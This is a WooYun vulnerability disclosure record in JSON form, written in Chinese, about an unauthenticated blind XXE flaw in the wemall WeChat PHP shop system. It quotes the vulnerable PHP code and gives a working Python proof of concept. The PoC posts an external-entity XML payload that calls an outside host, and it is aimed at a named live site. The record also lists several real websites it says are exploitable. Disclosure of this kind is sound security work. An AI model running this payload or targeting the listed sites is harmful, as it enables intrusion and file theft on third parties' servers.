{"id": 65608, "wybug_id": "wooyun-2015-0135615", "wybug_title": "wemall微信开源PHP商城系统一处blind xxe（无需登录，附POC）", "wybug_corp": "www.inuoer.com", "wybug_author": "1c3z", "wybug_date": "2015-08-22 11:44", "wybug_open_date": "2015-10-06 11:44", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： xxe 详细说明：  测试版本wemall 3.3下载地址 http://git.oschina.net/einsqing/wemall/repository/archive?ref=master 需要开源中国的账号\n//Application\\Lib\\Action\\Admin\\WechatAction.class.php<?phpclass WechatAction extends Action {\tpublic function init() {\t\timport ( 'wechat', APP_PATH . 'Common', '.class.php' );\t\t$config = M ( \"Wxconfig\" )->where ( array (\t\t\t\t\"id\" => \"1\" \t\t) )->find ();\t\t\t\t$options = array (\t\t\t\t'token' => $config [\"token\"], // 填写你设定的key\t\t\t\t'encodingaeskey' => $config [\"encodingaeskey\"], // 填写加密用的EncodingAESKey\t\t\t\t'appid' => $config [\"appid\"], // 填写高级调用功能的app id\t\t\t\t'appsecret' => $config [\"appsecret\"], // 填写高级调用功能的密钥\t\t\t\t);\t\t$weObj = new Wechat ( $options );\t\treturn $weObj;\t}\tpublic function index() {\t\t$weObj = $this->init ();\t\t$weObj->valid ();\t\t....剩下的省略\n可以看到index函数中$weObj为Wechat类的实例化而Wechat类从import ( 'wechat', APP_PATH . 'Common', '.class.php' );导入的也就是Application/Common/wechat.class.php重点关注valid()函数\npublic function valid($return=false)    {        $encryptStr=\"\";        if ($_SERVER['REQUEST_METHOD'] == \"POST\") {            $postStr = file_get_contents(\"php://input\");            $array = (array)simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);\t\t...省略\n直接使用了simplexml_load_string函数如何调用代码呢？访问index.php?g=Admin&m=Wechat&a=index如何利用参考： http://wooyun.org/bugs/wooyun-2010-098591下面是poc代码：\n#!/usr/bin/pythonimport urllib2import randomimport socketsocket.setdefaulttimeout(10)def send_xml(url,data):    import requests    try:        requests.post(url,data)    except Exception, e:        print edef poc(host):    url = 'http://' + host + '/index.php?g=Admin&m=Wechat&a=index'    key = \"\".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))    value = \"\".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))    data = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://pysandbox.sinaapp.com/kv?act=set&k={key}&v={value}\">%remote;]><root/>\"\"\"    data = data.replace('{key}', key).replace('{value}', value)    send_xml(url, data)    url = 'http://pysandbox.sinaapp.com/kv?act=get&k=' + key    res = urllib2.urlopen(url).read()    if value in res:        print \"xxe\"poc('www.mybuy.so')\n访问http://pysandbox.sinaapp.com/kv?act=set&k={key}&v={value} 可以在远程主机设置一个键值对http://pysandbox.sinaapp.com/kv?act=get&k=刚刚的key 可以查看是否设置了这个键值对商业版本也应该可以xxehttp://demo.inuoer.com/1/Admin/Wechat/index.html但是demo有防火墙   漏洞证明：  下面是存在xxe的http://www.dadodo.wang/index.php?g=Admin&m=Wechat&a=indexhttp://www.jxbar.com/index.php?g=Admin&m=Wechat&a=indexhttp://www.liushengjie.com/index.php?g=Admin&m=Wechat&a=indexhttp://www.wifi-xj.com/index.php?g=Admin&m=Wechat&a=indexhttp://www.tjguguai.net/index.php?g=Admin&m=Wechat&a=indexhttp://www.mallonline.com.cn/index.php?g=Admin&m=Wechat&a=indexhttp://www.mybuy.so/index.php?g=Admin&m=Wechat&a=index   修复方案：  http://wiki.wooyun.org/web:xxe-attack   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}